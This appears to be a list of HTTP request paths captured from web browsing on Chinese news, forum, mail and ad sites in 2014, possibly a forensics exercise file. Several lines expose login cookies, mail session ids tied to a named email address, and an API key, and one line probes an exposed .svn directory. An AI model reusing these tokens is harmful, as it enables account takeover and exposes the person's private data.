+/pingback.gif?h=59442CC4D1E8C5D91A9A3E553C3A0361&v=7.2.1.3736&r=0000_sogou_pinyin_72a.1404874898&id=G10000074&passport=&type=popup&ppversion=3.0.0.1825&popstatus=0
+/bizhi.gif?type=show&id=0528-15
+/thread-1880527-1-1.html
+/2014/20141029113855.jpg
+//201411/20141107115130078.jpg
+/2014/20141023110726.jpg
+/2014/20141030114206.jpg
+/2014/2014116163126.jpg
+/2014/2014116151743.jpg
+/2014/2014116142036.jpg
+/2014/2014116151649.jpg
+/2014/20141030162313.jpg
+/2014/2014117105937.jpg
+/2014/2014115160512.jpg
+/201411/20141171120335627_190x250.jpg
+/cpro/ui/c.js
+/201411/2014117950068265_190x250.jpg
+/201411/2014117921156661_190x250.jpg
+/201411/20141161522174402_190x250.jpg
+/information/progress
+/201411/20141161422216614_190x250.jpg
+/static/css/wide_viewthread.css
+/static/js/common.js?86l
+/static/js/forum.js?86l
+/static/js/logging.js?86l
+/static/js/forum_viewthread.js?86l
+/static/js/seditor.js?86l
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/xwb/images/xwb_base.css
+/xwb/images/xwb_2.css
+/static/js/jquery-1.7.2.min.js
+/201411/20141161450317258_190x250.jpg
+/home.php?mod=misc&ac=sendmail&rand=1417221867
+/static/js/delay.js?86l
+/static/js/footer.js?86l
+/xwb/images/bgimg/sina_login_btn.png
+/zh_CN/htmledition/images/qunfa/manage/picMode_light_s.png
+/static/image/common//qq_login.gif
+/cpro/ui/c.js
+/acom?di=u1651292&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=43x32&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x43&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=10&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/images/relevant_icon.gif
+/acom?di=u1648951&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=2&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=582x41&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x729&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=397&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/images/sub/video/share-icon.png
+/acom?di=u1648953&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=3&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=408x304&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x729&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=411&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/Login/inner_announce
+/acom?di=u1651294&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=4&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=718x681&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x1585&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=437&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/
+/acom?di=u1648903&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=5&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=1664x33&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x1685&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=450&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/images/201409/red-dots.jpg
+/acom?di=u1648941&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=6&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=1880x366&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x2169&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=469&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/
+/acom?di=u1672762&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=7&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=270x692&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x2169&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=484&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/images/201409/rank-number.gif
+/acom?di=u1651310&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=8&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=1076x692&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x2169&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=506&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/2014/2014917160446.jpg
+/acom?di=u1721559&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=9&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=2577x32&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x2577&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=532&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/images/201409/video-tl.gif
+/api/site/se?referer=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&response_type=js&s_id=2564273&s_site_gid=7&s_site_uid=0&ts=1417221867&sig=d96775fce97cb3205fb37b7c259b6840
+/ps_fp.htm?pid=ps&fp=3BD405A6244D04D1878B7B8AD3DE32F7&im=0&wf=1&br=2&qid=a2581d6300075c25&bi=F5B42E62CCA313E12B218A22042B376D:FG=1
+/cloud/scripts/discuz_tips.js?v=1
+/acom?di=u1721567&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=10&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=3258x32&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x3258&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=550&tlm=1415303870&tcn=1417221868&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/stat.php?id=140412&web_id=140412&show=pic
+/st/list2.php
+/ping.js?v=1VERHASH
+/static/image/common//background.png
+/static/image/deepin1/logo_line.jpg
+/static/image/deepin1/logo_bg.jpg
+/static/image/deepin1/menu_bg.jpg
+/static/image/deepin1/head_bg.jpg
+/cgi-bin/mail_spam?sid=L-BqX-DmjhlgCT9r&stat=getcopycontent&content=ThlwUYyvyHArEHdeyCnBsrdGU9WlIyzB&t=getcopycontent&action=copy_link&sid=L-BqX-DmjhlgCT9r
+/static/image/deepin1/normal_logo.jpg
+/heatmap/73/MjU2NDI3Mw==.js?rand=6525699912
+/st/ping2?v=&h=775587AA3AF0BE09C5BEF1458B4D73C9&ts=1417221898
+/static/image/deepin1/menu_hov.jpg
+/h.js?234ecb62337bb079d712e9dda22e24bd
+/static/image/deepin1/login.jpg
+/static/image/common//arw_l.gif
+/static/image/common//home.gif
+/static/image/feed/poke.gif
+/static/image/common//pmto.gif
+/static/image/feed/friend.gif
+/static/image/deepin1/sou.gif
+/static/image/common//search.png
+/static/image/common//px.png
+/ex?i=mm_16129824_2393751_23660694
+/static/image/deepin1/head_line.jpg
+/js/iframe.js?UYUserId=1747728
+/static/image/deepin1/menu_line.jpg
+/static/image/common//pt_item.png
+/xwb/images/bgimg/icon_off.gif
+/static/image/common//pn_post.png
+/stat.php?id=5580996&web_id=5580996
+/uc_server/data/avatar/002/66/68/81_avatar_middle.jpg
+/static/image/common//fj_btn.png
+/static/image/common//thread-prev.png
+/static/image/common//print.png
+/static/image/common//thread-next.png
+/static/image/common/online_member.gif
+/static/images/like.png?cdnversion=20120824
+/static/js/shell_v2.js?t=8
+/static/js/common_extra.js?86l
+/core.php?web_id=5580996&t=z
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/static/image/common//userinfo.gif
+/static//image/magic/checkonline.small.gif
+/static/js/bds_s_v2.js?cdnversion=393673
+/static/image/common//qzone.gif
+/static/image/common//weibo.png
+/static/image/common//pengyou.png
+/ex?i=mm_11803446_4530860_14842438
+/config/x100b.html
+/static/css/bdsstyle.css?cdnversion=20131219
+/t/tanxssp.js
+/static/image/common//oshr.png
+/t/tanxssp/main.js
+/static/image/common//fav.gif
+/stat.htm?id=5580996&r=&lg=en-us&ntime=none&cnzz_eid=1291539561-1417217219-&showp=1440x900&t=WireLurker...&h=1&rnd=1717102829
+/xwb/images/bgimg/icon_logo.png
+/static/image/magic/bump.small.gif
+/core.php?web_id=140412&show=pic&t=z
+/static/image/magic/highlight.small.gif
+/uc_server/data/avatar/002/55/53/89_avatar_middle.jpg
+/ex?i=mm_11803446_4530860_14854365
+/ext/related_items_v2?url=http://blog.163.com/slienceclown/blog/static/23873704120148223220859/&title=linux解压缩 - 懒喵的爪子的日志 - 网易博客&fromlocation=false&refer=http://slienceclown.blog.163.com/blogBackendManage.do?fromnewcenter&num=5&mode=3&pf=blog163&sitePrefix=http://blog.163.com/slienceclown/
+/xwb/images/xwb.js
+/xwb/images/xwb_tgc.js
+/common/d3/common_10_usergroup_icon.png
+/common/f4/common_94_usergroup_icon.png
+/static/image/common//qzone.gif
+/static/image/common//deepin/returnTop.png
+/download/14705/
+/q_stat.php?id=1000007890
+/h.js?6557398d368c2c5d56b4ebf03da843a7
+/mailEntry.do?blogad2=1&blog&v=4
+/prices/mgets?skuids=J_1012361,J_1204376,J_754259,J_1205278,J_1217493,J_1281976&type=1&callback=dsp_1417221860875&r=1417221860886
+/pyup.gif?h=775587AA3AF0BE09C5BEF1458B4D73C9&r=0000_sogou_pinyin_7_1_0_1719&v=7.4.0.4382&vd=1.0.0.14&vr=1.0.0.18
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1440x900&et=0&ja=0&ln=en-us&lo=0&nv=1&rnd=2061998666&si=6557398d368c2c5d56b4ebf03da843a7&st=1&v=1.0.70&lv=1&tt=WireLurker病毒恶意肆虐苹果手机 达人教手机防病毒高招 - 七丽女性网
+/core.php?web_id=1000007890&t=q
+/ex?i=mm_16129824_2393751_23660694&cb=jsonp_callback_76971&callback=&userid=&o=&f=&n=&re=1440x900&r=&cah=873&caw=1440&ccd=24&ctz=8&chl=1&cja=0&cpl=1&cmm=3&cf=-1&cg=a07394c28bc90d7f224dd5991a42b7b1&pvid=a83563b71f5578ce0f893bfc385b0ba5&ai=0&ac=9148&prh=67148221&cas=prh&cbh=3694&cbw=1024&dx=1&u=http://www.7y7.com/shuma/28/126028.html&k=&tt=WireLurker病毒恶意肆虐苹果手机 达人教手机防病毒高招 - 七丽女性网
+/flags/mgets?skuids=J_1012361,J_1204376,J_754259,J_1205278,J_1217493,J_1281976&callback=dsp_1417221860876&r=1417221860890
+/static/v2/img/tencent.png
+/stat.php?id=1848798&web_id=1848798
+/core.php?web_id=1848798&t=z
+/?imgurl=http://imglf1.ph.126.net/zHYjWPi3XKI1pNEwd0Hdtg==/2865696737908737169.jpg_115x115x1.jpg
+/?imgurl=http://imglf1.ph.126.net/KY4KHdvWfTKwGyAoSL5CJg==/646266546545014054.jpg_115x115x1.jpg
+/?imgurl=http://imglf1.ph.126.net/SJcZTL9FcRJ6yeaub3AeJQ==/2780972769918736414.jpg_240x150x1.jpg
+/code/css/jiathis_share.css
+/cpro/ui/i.js
+/data/2.4.0.8/brfversion.xml
+/data/brf2.dat_20141129080112
+/ex?i=mm_16129824_2393751_11444084
+/cpro/ui/f.js
+/static/js/like_shell.js?t=393673
+/ex?i=mm_16129824_2393751_11444084&cb=jsonp_callback_59440&callback=&userid=&o=&f=&n=&re=1440x900&r=&cah=873&caw=1440&ccd=24&ctz=8&chl=1&cja=0&cpl=1&cmm=3&cf=-1&cg=a229a372b342a3a1d54413b93b495ad4&pvid=a83563b71f5578ce0f893bfc385b0ba5&ai=1&ac=9148&prp=67133157&cas=prp&cbh=3944&cbw=1024&dx=1&u=http://www.7y7.com/shuma/28/126028.html&k=&tt=WireLurker病毒恶意肆虐苹果手机 达人教手机防病毒高招 - 七丽女性网
+/link?url=bucJrw-zHV7rSdGPP_xkjBIoCbTZEgo0AD1fVMixUnTmMLr2ma7D7pApxJFvFVxmK3BTlLY2hHMkP8nWWPANQei-CSysKnJdPFKhC36ufCO
+/acom?di=u1651321&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=0&dci=0&dri=0&dis=0&dai=11&dds=&drs=1&dvi=1414464365&ltu=http://www.7y7.com/shuma/28/126028.html&liu=&ltr=&lcr=&ps=3944x0&psr=1440x900&par=1440x873&pcs=1024x1024&pss=1024x3944&pis=-1x-1&cfv=0&ccd=24&chi=1&cja=false&cpl=1&cmi=3&cce=true&col=en-us&cec=UTF-8&cdo=-1&tsr=1881&tlm=1415303870&tcn=1417221869&tpr=1417221867607&dpt=none&coa=&baidu_id=
+/t/tanxssp.js
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=126.am
+/information/rank
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=www.lofter.com
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=huihui.cn
+/stat.htm?id=1000007890&r=&lg=en-us&ntime=none&cnzz_eid=711957223-1417221422-&showp=1440x900&t=WireLurker...&h=1&rnd=252952855
+/images/festival/2014chunjie/x.gif
+/201411/2014112441724921.jpg
+/201411/2014112441787453.jpg
+/201411/2014112441864109.jpg
+/201411/2014112441830937.jpg
+/ajaxhandler/handler.ashx?action=get_a_hits&id=126028&u=1
+/images/icon-close.png
+/static/js/logger.js?cdnversion=393673
+/static/js/like.js?cdnversion=393673
+/static/css/like.css?cdnversion=20121228
+/app/s.js?siteId=1285505&goTop=1
+/stat.htm?id=1848798&r=&lg=en-us&ntime=none&cnzz_eid=839053499-1417217548-&showp=1440x900&t=WireLurker...&h=1&rnd=946032377
+/da/g15/M05/0E/1C/rBEhWlJYrAEIAAAAAAACetYAYQwAAECuwP__W4AAAKS951.png
+/n5/jfs/t181/79/2809498728/59697/bace3715/53db5052N39910a85.jpg
+/n5/jfs/t220/27/1449670665/98715/c7ce9188/53fbe2a7Na6390373.jpg
+/getnum?url=http://bbs.shendu.com/thread-1880527-1-1.html&callback=bdShare.fn._getShare&type=load&t=1417221861095
+/t/tanxssp/main.js
+/static/css/comm/rank.css
+/static/js/chart.min.js
+/uc_server/data/avatar/002/56/61/07_avatar_middle.jpg
+/uc_server/data/avatar/002/09/44/48_avatar_middle.jpg
+/common/65/common_11_usergroup_icon.png
+/gsalphag2
+/poll?r=0.8064676220528781&u=648629762&s=7&k=H3mhqTxNAk6pJpqp&t=0&i=30&r=0.5482977824285626
+/static/image/common/security.png
+/ui?api=config&tu=1686406&pic=26&callback=bd__cbs__irwb7i
+/static/image/deepin1/login_nav.gif
+/static/image/common//midavt_shadow.gif
+/static/image/common//share_btn.png
+/tps/i3/TB1buFUGXXXXXcIXVXX1DxgFpXX-17-17.png
+/ui?src=1000&k=WireLurker%E7%97%85%E6%AF%92%E6%81%B6%E6%84%8F%E8%82%86%E8%99%90%E8%8B%B9%E6%9E%9C%E6%89%8B%E6%9C%BA%20%E8%BE%BE%E4%BA%BA%E6%95%99%E6%89%8B%E6%9C%BA%E9%98%B2%E7%97%85%E6%AF%92%E9%AB%98%E6%8B%9B%20-%20%E4%B8%83%E4%B8%BD%E5%A5%B3%E6%80%A7%E7%BD%91&iurl[]=http://pic.7y7.com//201411/20141107115130078.jpg&qid=uwrp0f1417221869792&tu=1686406&width=500&height=313&opt=1&v=7&cached=0&pic=32&dri=1&callback=bd__cbs__phquwq
+/tps/i4/TB1HRyeGXXXXXbRXXXX1DxgFpXX-17-17.png
+/tps/i2/T1oY3VXmNbXXXb8qDc-26-18.png
+/tps/i3/T1dt7VXiRaXXbd25o5-110-18.png
+/?url=http://www.7y7.com/shuma/28/126028.html&title=WireLurker病毒恶意肆虐苹果手机 达人教手机防病毒高招 - 七丽女性网&du=www.7y7.com&su=126028&pic=http://pic.7y7.com//201411/20141107115130078.jpg&vid=&tag=&uid=1747728&acl=&lang=zh-cn&5079253486
+/static/image/common//ad.gif
+/static/image/editor/editor.gif
+/static/image/common//pn.png
+/static/image/common//arrwd.gif
+/static/image/common//icon_quote_s.gif
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/stephenzhu/article/details/6417453
+/static/js/shell_v2.js?t=8
+/Login/userpage
+/static/image/common//icon_quote_e.gif
+/n5/jfs/t427/262/86772954/72202/2926ea96/54095cfeN57f5b110.jpg
+/n5/g16/M00/00/01/rBEbRVNpfYcIAAAAAANCYSk-6JIAAAAhwOAnskAA0J5769.jpg
+/static/js/shell_v2.js?t=8
+/n5/jfs/t286/271/995842399/768456/29136988/542d06c5N4289e325.jpg
+/n5/jfs/t490/141/631587265/30682/a45b5020/547848bfN37f6f0ea.jpg
+/dsp?pid=mm_16129824_2393751_11444084&bid=0a67f52c0000547916ed5798007d4e2b&nid=29628860&tanxssp_t=62031
+/static/image/deepin1/foot_bbs_bg.jpg
+/static/image/deepin1/foot_nav_lt.jpg
+/static/image/deepin1/foot_nav_rg.jpg
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/material/4e/6/593c52b9bb0e6b954a6c7d31adc3c.gif
+/get?buttontype=medium&cb=bdShare.ajax._callbacks.bd35cafdef8&index=0&url=http://www.7y7.com/shuma/28/126028.html
+/pingd?dm=bbs.shendu.com&url=/thread-1880527-1-1.html&arg=-&rdm=www.baidu.com&rurl=/s&adt=-&rarg=ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&pvi=4558201417&si=s430391260&ui=0&ty=1&fi=506&ti=1880527&rt=forum&md=viewthread&pn=1&qq=000&r2=2564273&scr=1600x900&scl=24-bit&lg=zh-cn&jv=1&pf=Win32&tz=-8&fl=15.0 r0&ct=-&ext=bc=0;adid=&r3=0
+/public03/imageplus/sticker/html_3_with_delay.app.js?cacheTime=393673
+/stat.htm?id=140412&r=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&lg=zh-cn&ntime=none&cnzz_eid=295189507-1417218418-http://www.baidu.com/&showp=1600x900&t=求助：deepin设置静态I...&h=1&rnd=1729229816
+/img/pic.gif
+/public03/imageplus/tip.png
+/cpro/exp/other/img/TU_LU2.png
+/public03/imageplus/tip-back.png
+/t/acookie/acbeacon2.html
+/Login/inner_announce
+/config/pcas_mac.json
+/code/v4.js
+/public03/imageplus/v2/dock/close.png
+/skin/default/css/style.css?v=1.1
+/scripts/SyntaxHighlighter/styles/default.css
+/track?0.0010725085157901049
+/content/loginbox/login.js
+/showblogmedal.ashx?blogid=105699
+/images/blog-icon-reply.png
+/adx.php?c=cz1kZmNlODEzMTcxZjIxNzQwAHQ9MTQxNzIyMTg2OQBzZT01AGJ1PTQAcHJpY2U9VkhrVzdRQU9KdzE3akVwZ1c1SUE4dG9NZW0yc0RKV2xxMUk3TncAY2htZD0xAGJkaWQ9AGNwcm9pZD0Adj0xAGk9MTYyMjA2M2I
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/cpro/ui/noexpire/img/2.0.1/bg.png
+/search_product.htm?q=navigare�콢��&type=p&style=&cat=all&vmarket=
+/ui/scripts/Csdn/counter.js
+/scripts/ad-blog.js
+/js/count.js
+/t.gif?cna=AZRoDAb2NT8CAT2WK3k4g8e+&cache=123
+/information/progress
+/poll?r=0.09067221288569272&u=657972246&s=7&k=6Yak8190Ftw3J5I3&t=0&i=30&r=0.6675983380991966
+/cgi-bin/readmail?folderid=6&folderkey=6&t=readmail&mailid=ZC0007-ERNUWhTVlz5iGjxowzSZM4b&mode=pre&maxage=3600&base=12.57&ver=14935&sid=lpQyPHJkRu_WYUcT
+/Login
+/dsp?pid=mm_11803446_4530860_14854365&bid=0a67f5230000547916ee419100910704&nid=29218413&tanxssp_t=96289
+/dsp?pid=mm_11803446_4530860_14842438&bid=0a67f5380000547916ee584b0085e4c2&nid=29218413&tanxssp_t=25784
+/wh/o.htm?ltr=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&cf=u
+/public/common/tag-suggest-pop/js/main.js?11810182
+/MFYwVKADAgEAME0wSzBJMAkGBSsOAwIaBQAEFAyBKTh0spYpEH7YNWJSZARTDeCDBBQNRFwWU0TBgn4dIKsl9AFj2L55pQIQBlIn/I2pWOqxQx7D8FUubQ==
+/cgi-bin/getqqicon?sid=lpQyPHJkRu_WYUcT&uin=&mode=newaddr&mailaddr=2014hctf6@gmail.com
+/cgi-bin/.svn/entries
+/wpad.dat
+/skin/default/images/body_bg.gif
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/cgi-bin/readmail?sid=lpQyPHJkRu_WYUcT&rank=10&mailid=ZC0007-ERNUWhTVlz5iGjxowzSZM4b&t=readsubmail&mode=fake&s=r2&base=12.57&pf=0&folderid=6&folderkey=6
+/favicon.ico
+/skin/default/images/head_bg.jpg
+/ui?src=1000&k=2014%E5%8F%B0%E6%B9%BE%E7%94%B5%E5%BD%B1%E9%87%91%E9%A9%AC%E5%A5%96%E7%BA%A2%E6%AF%AF&iurl[]=http://pic.7y7.com/201411/2014112441724921.jpg&qid=uwrp0f1417221869792&tu=1686406&width=300&height=210&opt=1&v=7&cached=0&pic=32&dri=2&callback=bd__cbs__lxzo36
+/images/ico_notice.png
+/public03/imageplus/v2/dock/close.png
+/cpro/ui/noexpire/img/2.0.1/bg.png
+/cpro/exp/other/img/TU_LU2.png
+/public03/imageplus/tip-back.png
+/public03/imageplus/tip.png
+/adx.php?c=cz02YjhhMWQxZjg2NWZlZjM4AHQ9MTQxNzIyMTg3MQBzZT01AGJ1PTQAcHJpY2U9VkhrVzd3QUp2REI3akVwZ1c1SUE4bDhEQi04c2M0LWszWDJPaUEAY2htZD0xAGJkaWQ9AGNwcm9pZD0Adj0xAGk9OGM3ZjNmZjc
+/avatar/36241D86F96C3412AB384A93E7ABB42?d=http://res.mail.qq.com/zh_CN/htmledition/images/rss/male.gif
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000D0gtMDk6Texewu4N000000.mLFW5HTvnjb0pydM5HDknjDdrHTsPjmYPWm1njD1PH6d0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&start=1417221869422&site_api_loaded=1417221869790&opt=1&v=7&found=1417221869793&loading=1417221869796&loaded=1417221869923&render_loaded=1417221870305&ad_count=1&pg_rect=0_0_1024_1024&img_rect=727_107_500_313&showed=1417221870323&render=http://ecma.bdimg.com/public03/imageplus/sticker/html_3_with_delay.app.js&union_id=1686406&actionid=8
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000D0gtMDk6Texewu4N000000.mLFW5HTvnjb0pydM5HDknjDdrHTsPjmYPWm1njD1PH6d0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=4&attach=0&time=1417221870323
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000jWEg3mxZmGoeku4N000000.mLFW5HRYPH640A-Vu1Y3PjT4njTknHnvPHf3n16LrHcd0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=4&attach=0&time=1417221871644
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000D0gtMDk6Texewu4N000000.mLFW5HTvnjb0pydM5HDknjDdrHTsPjmYPWm1njD1PH6d0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=1&attach=0&time=1417221870424
